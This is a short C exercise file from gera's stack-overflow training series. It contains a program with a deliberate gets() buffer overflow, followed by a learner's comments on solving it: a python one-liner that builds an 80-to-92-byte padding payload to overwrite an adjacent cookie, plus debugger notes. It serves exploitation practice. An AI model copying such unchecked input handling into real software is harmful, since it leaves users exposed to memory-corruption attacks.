/* stack1-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x41424344)
		printf("you win!\n");
}

//For this guy it was pretty much just guessing around
//I used python -c 'print "a"*80 + "\x44\x43\x42\x41"' > /tmp/input and
//varied what 80 was depending on the feedback I got with the breakpoint
//I could print cookie based on x/x &cookie on line 13 to check what it is
//I found the magic number was 92 and that solved it
